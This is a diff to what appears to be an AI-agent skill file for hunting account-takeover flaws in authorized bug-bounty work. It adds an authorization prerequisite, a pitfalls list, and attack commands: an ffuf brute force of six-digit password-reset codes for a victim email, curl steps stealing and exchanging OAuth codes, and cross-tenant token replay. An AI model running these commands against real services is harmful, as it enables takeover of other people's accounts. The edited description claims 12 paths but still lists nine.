@@ -1,15 +1,44 @@
 ---
 name: hunt-ato
-description: "Hunt account takeover taxonomy — 9 distinct paths to ATO, plus chains. Paths: (1) password reset flaws (host-header injection redirects token, predictable/numeric token, Referer leak, no-expiry/reuse), (2) email change without re-auth, (3) OAuth account-link CSRF, (4) MFA bypass (per hunt-mfa-bypass), (5) session fixation, (6) JWT manipulation (alg:none, RS256→HS256 key confusion, weak HMAC secret, kid injection), (7) password change without step-up (chain with login timing/length oracle), (8) social-recovery / security-question brute-force, (9) SSO subdomain takeover at OAuth redirect_uri. Chains: cookie theft + password oracle + no step-up = persistent ATO; lax redirect_uri = auth-code theft; dangling-CNAME takeover at redirect_uri = ATO. Validate: demonstrate real takeover of test account B from attacker A's session; OOB/Collaborator confirm blind token-leak steps. Use when hunting ATO chains, testing password reset / email change / MFA / OAuth / session / JWT, or chaining primitives toward Critical."
+description: "Hunt account takeover taxonomy — 12 distinct paths to ATO, plus chains. Paths: (1) password reset flaws (host-header injection redirects token, predictable/numeric token, Referer leak, no-expiry/reuse), (2) email change without re-auth, (3) OAuth account-link CSRF, (4) MFA bypass (per hunt-mfa-bypass), (5) session fixation, (6) JWT manipulation (alg:none, RS256→HS256 key confusion, weak HMAC secret, kid injection), (7) password change without step-up (chain with login timing/length oracle), (8) social-recovery / security-question brute-force, (9) SSO subdomain takeover at OAuth redirect_uri. Chains: cookie theft + password oracle + no step-up = persistent ATO; lax redirect_uri = auth-code theft; dangling-CNAME takeover at redirect_uri = ATO. Validate: demonstrate real takeover of test account B from attacker A's session; OOB/Collaborator confirm blind token-leak steps. Use when hunting ATO chains, testing password reset / email change / MFA / OAuth / session / JWT, or chaining primitives toward Critical."
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
-category: redteam
-tags: [ATO, account-takeover, hunt, redteam]
+platforms: [linux]
+metadata:
+  tags: [ATO, account-takeover, hunt, redteam]
+  category: redteam
 ---
 
+## When to Use
+
+- Hunting ATO chains, testing password reset / email change / MFA / OAuth / session / JWT.
+- Chaining primitives toward Critical.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `dig`, `ffuf`, `gh`, `hashcat`, `openssl`, `python3`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# 6-digit numeric OTP-style reset code, no rate limit:
+ffuf -u "https://target.com/api/reset/verify" -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"email":"victimB@company.com","code":"FUZZ"}' \
+  -w <(seq -w 000000 999999) -mc 200 -fr "invalid" -t 5
+# time-based tokens: capture 5 tokens, diff — md5(timestamp)/sequential int = predictable
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
+
 ## 13. ATO — ACCOUNT TAKEOVER TAXONOMY
-> 9 distinct paths. ATO is a destination class, not a single bug — each path below is a primitive that becomes Critical only when you demonstrate takeover of a SECOND account (test account B) you do not control, from attacker A's session/IP/device. A path that only locks you out of your own account, or only works when you already hold the victim's password AND session, is not a standalone ATO.
+> 12 distinct paths. ATO is a destination class, not a single bug — each path below is a primitive that becomes Critical only when you demonstrate takeover of a SECOND account (test account B) you do not control, from attacker A's session/IP/device. A path that only locks you out of your own account, or only works when you already hold the victim's password AND session, is not a standalone ATO.
 
 ### Path 1: Password Reset Poisoning (Host-Header)
 ```bash
@@ -249,7 +278,7 @@ for cc in "" "code_challenge_method=S256&code_challenge=$(echo -n 'test' | opens
     # Step 1: get auth code
     code=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{redirect_url}" \
       "https://target.com/oauth/authorize?response_type=code&client_id=xxx&redirect_uri=https://app.com/cb&state=x$cc" \
-      | grep -Eo 'code=\K[^&]+')
+      | grep -Po 'code=\K[^&]+')
     [[ -z "$code" ]] && echo "NO CODE" && continue
     # Step 2: exchange
     resp=$(curl --max-time 30 --connect-timeout 10 -s -X POST "https://target.com/oauth/token" \
@@ -292,7 +321,8 @@ curl --max-time 30 --connect-timeout 10 -v "https://login.microsoftonline.com/co
 # 1. Register same app client_id in YOUR tenant
 # 2. Authenticate as user in YOUR tenant → get access_token
 # 3. Use that token against the VICTIM's tenant API
-curl --max-time 30 --connect-timeout 10 -H "Authorization: Bearer *** https://victim-tenant.com/api/user/me
+TOKEN="<access_token_from_your_tenant>"
+curl --max-time 30 --connect-timeout 10 -H "Authorization: Bearer $TOKEN" "https://victim-tenant.com/api/user/me"
 # If accepted → the app doesn't validate the "tid" (tenant ID) claim → cross-tenant ATO
 ```
 
@@ -303,6 +333,20 @@ curl --max-time 30 --connect-timeout 10 -H "Authorization: Bearer *** https://vi
 TOKEN=$(curl --max-time 30 --connect-timeout 10 -s -X POST 'https://login.microsoftonline.com/attacker-tenant.onmicrosoft.com/oauth2/v2.0/token' -d 'client_id=xxx&scope=https://target.com/.default&grant_type=client_credentials&client_secret=xxx' | python3 -c 'import sys,json; print(json.load(sys.stdin).get("access_token",""))')
 curl --max-time 30 --connect-timeout 10 -s -H "Authorization: Bearer $TOKEN" "https://target.com/api/user/me" -w "\nHTTP %{http_code}"
 ```
+
+---
+
+## Pitfalls
+
+- **Self-ATO is not ATO** — changing your own password, resetting your own account, or locking yourself out proves nothing. You MUST demonstrate takeover of a SECOND test account (victim B) from attacker A's session/IP.
+- **Host-header injection without email confirmation** — the reflected header value appearing in a test response doesn't prove the reset link was poisoned. Read the actual email (use a Collaborator domain and a controlled victim B inbox).
+- **Predictable token without exploitation** — finding a pattern (sequential numeric, timestamp-based) is a primitive, not ATO. Demonstrate actual token prediction and account takeover.
+- **No-expiry token is not Critical alone** — a token that doesn't expire is a primitive. Combine with token-leak vector (Referer, open redirect, logs) to reach Critical.
+- **OAuth redirect_uri lax matching without subdomain takeover** — `redirect_uri=*.target.com` is only exploitable if you can host on a subdomain you control. Without takeover, this is Low at best.
+- **PKCE test with S256 but no check of plain fallback** — if the server accepts plain code_challenge_method but the client uses S256, the plain path is the vulnerability. Test both.
+- **Device code flow polling interval** — if the interval is 5 seconds, brute-force is impractical. Only exploitable when the interval is very short (<1s) or the code space is small.
+- **Cross-tenant token replay without token validation** — if the `tid` (tenant ID) claim is validated by the API, cross-tenant replay fails. Verify the token is accepted before reporting.
+- **Cookie theft chain without demonstrating the chain** — "if an attacker steals the cookie" is not a finding. Demonstrate the theft vector (XSS, token leak, MITM) or chain with a real cookie-leak primitive.
 
 ---
 
@@ -336,20 +380,6 @@ Run this self-test to confirm ATO hunting readiness:
    ```
 
 All 4 tests verify the ATO hunting methodology is properly documented.
-
----
-
-## Pitfalls
-
-- **Self-ATO is not ATO** — changing your own password, resetting your own account, or locking yourself out proves nothing. You MUST demonstrate takeover of a SECOND test account (victim B) from attacker A's session/IP.
-- **Host-header injection without email confirmation** — the reflected header value appearing in a test response doesn't prove the reset link was poisoned. Read the actual email (use a Collaborator domain and a controlled victim B inbox).
-- **Predictable token without exploitation** — finding a pattern (sequential numeric, timestamp-based) is a primitive, not ATO. Demonstrate actual token prediction and account takeover.
-- **No-expiry token is not Critical alone** — a token that doesn't expire is a primitive. Combine with token-leak vector (Referer, open redirect, logs) to reach Critical.
-- **OAuth redirect_uri lax matching without subdomain takeover** — `redirect_uri=*.target.com` is only exploitable if you can host on a subdomain you control. Without takeover, this is Low at best.
-- **PKCE test with S256 but no check of plain fallback** — if the server accepts plain code_challenge_method but the client uses S256, the plain path is the vulnerability. Test both.
-- **Device code flow polling interval** — if the interval is 5 seconds, brute-force is impractical. Only exploitable when the interval is very short (<1s) or the code space is small.
-- **Cross-tenant token replay without token validation** — if the `tid` (tenant ID) claim is validated by the API, cross-tenant replay fails. Verify the token is accepted before reporting.
-- **Cookie theft chain without demonstrating the chain** — "if an attacker steals the cookie" is not a finding. Demonstrate the theft vector (XSS, token leak, MITM) or chain with a real cookie-leak primitive.
 
 ---
 
